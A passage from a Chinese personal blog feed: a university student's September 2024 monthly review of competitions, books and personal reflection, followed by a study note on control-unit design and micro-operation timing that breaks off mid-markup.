        <content type="html"><![CDATA[<h1 id="9月总结2024"><a class="markdownIt-Anchor" href="#9月总结2024"></a> 9月总结·2024</h1><p>今年是在大学的第三年。</p><p>恍惚之间竟然大三了，而大一刚踏入校园大门的那一刻却仿佛还历历在目。不知不觉，我距离毕业离开校园的日子已经相较进入大学时更加接近了。你问我做好准备了吗？并不尽然。不过，谁又能总是以万全之态迈向未来呢？正因此时并不完美，现在的我才格外完美。</p><p>浅浅的总结一下暑假+9月吧。</p><h2 id="暑假篇"><a class="markdownIt-Anchor" href="#暑假篇"></a> 暑假篇</h2><p>没错，暑假不出意料的摸了：）</p><p>7月沉迷老头环，8月爆肝黑神话，两个月暑假就这么奉献给两款3A了。该说不说，还是挺快乐的。不过倒也不是完全在打游戏，7月中旬参加了一个进入省级决赛的互联网+项目组，我的日常就是按照API文档实现几个前端接口，然后做好产品交付部分的PPT。没办法，再深层了我也接触不到。整个项目都是立于实验室的一个博士师兄上的，作为一个划水蹭奖的本科生，恐怕也就只能做这么多了。说是项目保底省铜，不过即使已经过了上一学年的综测评定这个奖仍然前途未卜。罢了罢了，就算在下一学年的吧。</p><p>8月下旬和朋友一起去打了羊城杯，许久不学web再打CTF还是相当吃力的，不过本着友谊第一比赛第二的原则还是坚持了下来。虽说技术没长进多少，但却接触到了一些难以明说的利益圈子。对此我也并不感到很吃惊，我早就预感到世界就是个巨大的草台班子。只能说，我并不后悔做出离开网安这个行业的决定，兴许以后会出于兴趣再去打打比赛，但这个圈子水太深，浅尝辄止即可。</p><p>虽然这个暑假没学多少技术，但总归还是挺开心的。倘若是明年的暑假，势必要辛苦许多吧。</p><h2 id="比赛篇"><a class="markdownIt-Anchor" href="#比赛篇"></a> 比赛篇</h2><p>草草交代完暑假，就来聊聊9月份的事情吧。</p><h3 id="全国大学生数学建模竞赛"><a class="markdownIt-Anchor" href="#全国大学生数学建模竞赛"></a> 全国大学生数学建模竞赛</h3><p>没想到上个学期的校赛竟然出人意料的发挥不错，进入了推荐名单。于是乎，9月份就得正式参加国赛了。先说说比赛情况吧，应该是保三冲二了，固然说不上多好。不过我本来也缺乏对建模系统的学习，这个结果到也还说得上是情理之中，只是怕拖了两位数学专业朋友的后腿。这次比赛的队友人都很好，也愿意在我不懂的时候手把手教我思路和计算，我也实打实的感觉学到了点东西。比赛期间大家都很努力，尤其周末两天我全程泡在讨论室里，饭都是队友帮忙带的，字面意义上的在图书馆坐一天不动。That’s crazy huh，it never happens again.</p><p>总的来说，这应该是我参加的最后一次数模比赛了吧，感觉意外的还不错。</p><h2 id="书籍篇"><a class="markdownIt-Anchor" href="#书籍篇"></a> 书籍篇</h2><h3 id="程序员的自我修养"><a class="markdownIt-Anchor" href="#程序员的自我修养"></a> 程序员的自我修养</h3><p>一本好书，深入浅出的介绍了装载、链接与库的知识，对计算机编译这块的理解很透彻。不过我目前还只读了前两三章就暂时搁置了，因为它的内容有点太偏底层，和我目前在研究的网络开发相关性不大。</p><p>可以说是一本关于计组和操作系统的启蒙书籍，对新手程序员的帮助很大。不得不感慨计算机类的很多知识都是触类旁通的，先前学习Go的接口概念花了很长时间去理解，在阅读完这本书关于系统API的内容后感觉豁然开朗。虽然两者严格来说并不是同一概念，但设计的底层思想是相通的。同时这本书也简单谈到了死锁等操作系统层面上的知识，这又于我在Go中的并发编程相关联。总之，是一本值得一读的好书。如果你平时研究计算机底层，比如PWN，更是不容错过。</p><h3 id="操作系统概论"><a class="markdownIt-Anchor" href="#操作系统概论"></a> 操作系统概论</h3><p>操作系统课的代餐。学校还是一副死德行，精华的复习PPT藏着掖着，上课只管水课时。于是乎我就按照课程推荐的课本选了这本黑皮书来看，我觉得黑皮书的通病都是过于神神叨叨，和奉行极简主义的学校PPT反其道而行之。作为一本百科类的科普读物快速的过一遍最好，但也很难说真正学到了什么东西，大部分知识都是入脑即忘。缺乏系统的总结和归纳，很难把操作系统学好。</p><p>我想，对于这种专业课来说，真要学起来还得看期末周速通吧……</p><h3 id="go语言圣经"><a class="markdownIt-Anchor" href="#go语言圣经"></a> Go语言圣经</h3><p>虽然暑假没看多少，但是9月份还是立刻把这本书通了。不过也没有读完，我差不多把Go的接口和共享变量编程看了一遍，并且成功搓出了第一个网络编程——一个简陋的聊天室。不过后续关于Go自带的工具包和调试以及底层编程我暂时先把它们丢在了一边，反正一时半会也用不着。关于接口和基于共享变量的并发编程，不久之后会出一篇总结作为我对Go语言学习的休止符。接着计划再用Go做一个小小的项目，彻底为Go的学习画上一个句号（暂时）。</p><h3 id="go-web编程"><a class="markdownIt-Anchor" href="#go-web编程"></a> Go Web编程</h3><p>友人推荐的一本Go Web编程类书籍，只看了两章就暂且搁置了。只想吐槽Go的template模板太抽象了，看得我眉头大皱。</p><p>还是老老实实找个视频看吧</p><h3 id="霍乱时期的爱情"><a class="markdownIt-Anchor" href="#霍乱时期的爱情"></a> *霍乱时期的爱情</h3><p>很复杂，看完不知道该说什么好。夸张点说，把我对爱情的概念击得粉碎。</p><p>霍乱这本书，几乎把爱情的所有形式都一一穷举了一遍。你身边的，你能想到的，几乎都可以在书里找到原型。哪一种才是真正的爱情呢？答案是，这些都可以是爱情。两厢厮守是爱情，红杏出墙是爱情；执着等待是爱情，放荡滥交是爱情；举案齐眉是爱情，卑微讨好是爱情；恪守底线是爱情，打破原则是爱情；守寡服丧是爱情，放情纵欲是爱情；追求不懈终于抱得美人归是爱情，望眼欲穿最后屈服于现实还是爱情。可以预见的是，这些故事倘若进入主流文学中，必将激起堆叠如山的众怒和辱骂，并伴随着最为不堪入耳的诋毁。但大师就是大师，马尔克斯可根本不考虑这些。严肃文学最喜欢做的事情，就是把道德这块遮羞布扯得稀烂，直面背后的人性与现实。</p><h3 id="挪威的森林"><a class="markdownIt-Anchor" href="#挪威的森林"></a> *挪威的森林</h3><p>最喜欢的一本书之一，无论几遍都读不腻。</p><h3 id="络新妇之理"><a class="markdownIt-Anchor" href="#络新妇之理"></a> *络新妇之理</h3><p>友人推荐的新书，还没来得及细看。第一印象是谜语人，其次是名字好难记。</p><h2 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h2><h3 id="软著"><a class="markdownIt-Anchor" href="#软著"></a> 软著</h3><p>蹉跎了两个月的任务，终归还得等到开学后来办。只想吐槽申办软著的流程之繁琐与麻烦，不比镇关西把猪肉切成臊子简单。要走代理吧，那边又狮子大开口要收1000代理费，而且接受十分团购不单做，不接受砍价，只好自己慢慢来。</p><p>如果能申请到能拿一个第一著作权，至于用处多大还有待考证。</p><h3 id="综测"><a class="markdownIt-Anchor" href="#综测"></a> 综测</h3><p>评的是上个学年的综测，算是对我的大二做一个小小的总结吧。光看排名的话，还是令人满意的，相较于去年又前进了一名，奖学金应该是稳了。不过细看的话，又免不了一番长吁短叹。我的绩点其实并不理想，甚至于说是炸裂的程度，但综测成绩却名列前茅，不得不让人遐想：假如我绩点能再高一点，岂不是稳拿国奖？不过可惜，如果永远只是如果，当不得真。换个角度来看，能一路逆袭到此，也是我当了一年牛马应得的奖励。有人说综测水分很大说明不了什么，综测不本来就是靠水的吗。既然大家都在水，水的高一点也不容易……不管怎么说，能继续拿奖学金就是对我过去一年的最好肯定，我也难得可以开心一会了。</p><h2 id="随便写点"><a class="markdownIt-Anchor" href="#随便写点"></a> 随便写点</h2><p>其实如果参考我过去的每月总结的话，可以看出来我这个月其实没干多少事，而我本人的看法也是一样。而我没干多少事的原因也很简单，因为：我也不知道我该干什么了。</p><p>回头看过去的两年，其实走了相当多的弯路，做了很多费力不讨好的事，错过了很多唾手可得的机会，和很多事情擦肩而过。兜兜转转，事到如今，我竟然也弄丢了该前进的方向。</p><p>迷茫，大概就是9月份的主旋律吧。</p><p>我提起书包踏入教学楼，魂不守舍的坐在座位上，既听不清老师在课堂上叽里咕噜何物，也不知道自己打开电脑该自学些什么东西。最后干脆一不做二不休，听不进去的课干脆不去上了。可坐在寝室和坐在教室也并不不同，点几个知乎刷几个视频，全然不知该做些什么好。看着朋友们钻研技术，做项目的做项目，打比赛的打比赛，我就像是洛夫克拉夫特笔下的异乡人，跟个无头苍蝇似的乱撞。</p><p>步入大四的学长们也找到了自己的路，有保研去华科的，有收到字节offer的，而我根本没有信心与勇气敢于他们并列。两相煎熬之下，使得我愈加郁闷。</p><p>事情的转折来自于另一位朋友。</p><p>彼时他刚刚建立起自己的博客，兴致勃勃的给博客搭载美化，上传笔记，并积极的招揽学弟学妹们前来参观学习。一股本能的冲动涌上心头，我也想要和别人宣传自己的博客。但这个想法刚刚露头就被我否决了，我，没有自信。其实在博客写了那么多字，我却有些不敢再轻易点开它，我害怕在颓废的当下，会瞥见那个过去意气风发的自己，那个兴致勃勃的给博客搭载美化，上传笔记，想方设法引人参观自己博客的自己。那时的我是多么快乐啊，一瞬间我就明白了人们为何如此热衷于怀旧的原因：无非是过去的自己曾经拥有无限可能，而如今生活却只剩下一地鸡毛而已。</p><p>不过，我终究也还是开始动起来了。</p><p>不管是出于幼稚的好强心也好，还是潜移默化的夫唱妇随也罢，我也决定给自己的博客加点美化。结果是一发不可收拾，只要动起来，我好似又有了无穷多的精力，仿佛找回了某种决心，心中快速给自己规划出了图画。</p><p>“曾经我如此衰老，如今我才风华正茂”，黑神话悟空的制作人冯骥在接受采访时如是说。黑神话的开发用了八年，而我却在短短一个月的时间内体会到了这句话的精髓。虽然我仍然无法排遣对未来的忧愁，但我如今，当下，眼前，只想要动起来，别无他想。</p><p>进入大三后，我要退出那些繁琐的比赛，还给自己一个清静的大学生活。船会在河流的带动下往前航行，而人应该要自己动起来向前走而非依靠于某些外物推动。从今往后，我的每月总结上出现的事情应该会越来越少，但这说明不了什么。贪多嚼不烂，自己有所收获才是真的。哪怕下学期拿不到奖学金也罢，是时候看长远一些了。</p><p>作为启动的时间来说，一个月可能有些长了。不过只要计算机还能继续运行，多重启几次又何妨？感谢我的朋友们，没有他们我也许还会继续消沉下去吧。船到桥头自然直，好死不如赖活着，不如莫问前程，且听风吟。</p><p>最后说一句，我英语六级第一次就过了。</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/26424396_p0.jpg" alt="26424396_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> 月度总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成指北（七）</title>
      <link href="/posts/1c2342ee510b/"/>
      <url>/posts/1c2342ee510b/</url>
      
        <content type="html"><![CDATA[<h2 id="第十章-控制单元的设计"><a class="markdownIt-Anchor" href="#第十章-控制单元的设计"></a> 第十章 控制单元的设计</h2><blockquote><p>就是一道大题<br />最关键的微程序设计指令<br />画出微指令码点</p></blockquote><p>学习完控制单元的结构后，我们来学习控制单元的两种设计方法：</p><ul><li>组合逻辑设计</li><li>微程序设计</li></ul><p>这也是计算机组成原理的最后一个组成部分。</p><h3 id="组合逻辑设计"><a class="markdownIt-Anchor" href="#组合逻辑设计"></a> 组合逻辑设计</h3><h4 id="cu外特性"><a class="markdownIt-Anchor" href="#cu外特性"></a> CU外特性</h4><p>要理解组合逻辑设计的方式，我们先给出CU的外特性图并且一一说明。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706141431460.png" alt="image-20240706141431460" style="zoom:50%;" /><p>其中，CU发出的<strong>控制信号的先后关系与时间点的确定</strong>，由节拍发生器确定。如果你忘记了节拍的概念，去复习第九章的多级时序系统，或者参考下图。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706141948426.png" alt="image-20240706141948426" style="zoom:33%;" /><p>而CU<strong>产生什么控制命令</strong>，依赖于：</p><ol><li>操作码译码输出，一条指令，对应仅有一条线有效。也就是图中的操作码译码部分，n位操作码对应2<sup>n</sup>条指令，所有译码器输出2<sup>n</sup>根线到CU。</li><li>标志，如跳转条件等也可以控制CU输出什么样的微指令</li></ol><p>在一个节拍内，C<sub>0</sub>到C<sub>k</sub>会有一个或几个有效，即产生的微指令。</p><h4 id="微操作的节拍安排"><a class="markdownIt-Anchor" href="#微操作的节拍安排"></a> 微操作的节拍安排</h4><p>回顾了CU外特性后，我们来讨论各种微操作如何进行安排。</p><p>假设我们采取同步控制的方式，且认为一个机器周期内含3个节拍，CPU的内部采取非总线方式设计。微操作按照执行的顺序安排在给定的节拍中，控制计算机的各个组成部分稳定协调的工作。一个时钟周期有多少个节拍，跟周期中需要产生控制信号的数量，复杂程度，控制信号之间是否能并行都有关</p><p>在安排微操作时序时，我们要遵循三个原则：</p><ol><li>微操作的<strong>先后顺序</strong>不得随意更改</li><li><strong>被控对象不同</strong>的微操作尽量安排在一个节拍内完成，即<strong>可以并行</strong>的微操作，没有先后顺序的操作</li><li><strong>占用时间较短</strong>的微操作尽量安排在一个节拍内完成，并<strong>允许有先后顺序</strong>，比如一个在上升沿，一个在下降沿</li></ol><p>基于以上三大原则，我们来重新回顾取指周期、间址周期、执行周期、中断周期的节拍安排。</p><h5 id="取值周期微操作的节拍安排"><a class="markdownIt-Anchor" href="#取值周期微操作的节拍安排"></a> 取值周期微操作的节拍安排</h5><ol><li><p>T<sub>0</sub></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>C</mi><mo>→</mo><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">PC\rightarrow MAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">1\rightarrow R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>基于原则二，取指地址送入MAR和控制寄存器发出读信号可以并行。</p></li><li><p>T<sub>1</sub></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">(</mo><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">M(MAR)\rightarrow MDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>P</mi><mi>C</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mo>→</mo><mi>P</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">(PC)+1\rightarrow PC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></p><p>基于原则二，将数据从内存取回和递增PC可以并行</p></li><li><p>T<sub>2</sub></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mi>D</mi><mi>R</mi><mo>→</mo><mi>I</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">MDR\rightarrow IR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mi>P</mi><mo stretchy="false">(</mo><mi>I</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>I</mi><mi>D</mi></mrow><annotation encoding="application/x-tex">OP(IR)\rightarrow ID</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span></p><p>基于原则三，由于MDR将指令送入IR是在CPU内部传输，故耗时短，和指令译码安排在同一节拍</p></li></ol><h5 id="间址周期微操作的节拍安排"><a class="markdownIt-Anchor" href="#间址周期微操作的节拍安排"></a> 间址周期微操作的节拍安排</h5><ol><li><p>T0</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>d</mi><mo stretchy="false">(</mo><mi>I</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">Ad(IR)\rightarrow MAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">1\rightarrow R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p></li><li><p>T2</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">(</mo><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">M(MAR)\rightarrow MDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p></li><li><p>T3</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mi>D</mi><mi>R</mi><mo>→</mo><mi>A</mi><mi>d</mi><mo stretchy="false">(</mo><mi>I</mi><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">MDR\rightarrow Ad(IR)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span></p></li></ol><h5 id="执行周期微操作的节拍安排"><a class="markdownIt-Anchor" href="#执行周期微操作的节拍安排"></a> 执行周期微操作的节拍安排</h5><p>我们来分析执行周期中介绍的十条微指令的节拍安排，他们中的大部分都十分简单，只消一条微指令足矣。故这里直接给出总结性的表格。</p><table><thead><tr><th style="text-align:center">编号</th><th style="text-align:center">指令</th><th style="text-align:center">T0</th><th style="text-align:center">T1</th><th style="text-align:center">T2</th></tr></thead><tbody><tr><td style="text-align:center">①</td><td style="text-align:center">CLA</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center">0 ⟶ AC</td></tr><tr><td style="text-align:center">②</td><td style="text-align:center">COM</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center">AC ⟶ AC</td></tr><tr><td style="text-align:center">③</td><td style="text-align:center">SHR</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center">L(AC) ⟶ R(AC)<br>AC ⟶ AC</td></tr><tr><td style="text-align:center">④</td><td style="text-align:center">CSL</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center">R(AC) ⟶ L(AC)<br>AC ⟶ AC</td></tr><tr><td style="text-align:center">⑤</td><td style="text-align:center">STP</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center">0 ⟶ G</td></tr><tr><td style="text-align:center">⑥</td><td style="text-align:center">ADD X</td><td style="text-align:center">Ad(IR) ⟶ MAR<br>1 ⟶ R</td><td style="text-align:center">M(MAR) ⟶ MDR</td><td style="text-align:center">(AC) + (MDR) ⟶ AC</td></tr><tr><td style="text-align:center">⑦</td><td style="text-align:center">STA X</td><td style="text-align:center">Ad(IR) ⟶ MAR<br>1 ⟶ W</td><td style="text-align:center">AC ⟶ MDR</td><td style="text-align:center">MDR ⟶ M(MAR)</td></tr><tr><td style="text-align:center">⑧</td><td style="text-align:center">LDA X</td><td style="text-align:center">Ad(IR) ⟶ MAR<br>1 ⟶ R</td><td style="text-align:center">M(MAR) ⟶ MDR</td><td style="text-align:center">MDR ⟶ AC</td></tr><tr><td style="text-align:center">⑨</td><td style="text-align:center">JMP X</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center">Ad(IR) ⟶ PC</td></tr><tr><td style="text-align:center">⑩</td><td style="text-align:center">BAN X</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center">A₀·Ad(IR) + A₀·PC ⟶ PC</td></tr></tbody></table><p>CLA等这些简单指令不一定要放在T<sub>2</sub>中，T<sub>0</sub>~T<sub>2</sub>均可。</p><h5 id="中断周期微操作的节拍安排"><a class="markdownIt-Anchor" href="#中断周期微操作的节拍安排"></a> 中断周期微操作的节拍安排</h5><p>我们来回忆一下中断周期的三个操作：</p><ol><li>保存断点</li><li>形成中断服务程序入口地址，假设用硬件向量法实现</li><li>关中断，即中断允许触发器置0</li></ol><p>基于以上步骤，我们来安排中断周期的微指令节拍。</p><ol><li><p>T<sub>0</sub></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>→</mo><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">0\rightarrow MAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mi>W</mi></mrow><annotation encoding="application/x-tex">1\rightarrow W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span></span></p><p>硬件关中断</p></li><li><p>T<sub>2</sub></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>C</mi><mo>→</mo><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">PC\rightarrow MDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p></li><li><p>T<sub>3</sub></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mi>D</mi><mi>R</mi><mo>→</mo><mi>M</mi><mo stretchy="false">(</mo><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">MDR\rightarrow M(MAR)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord 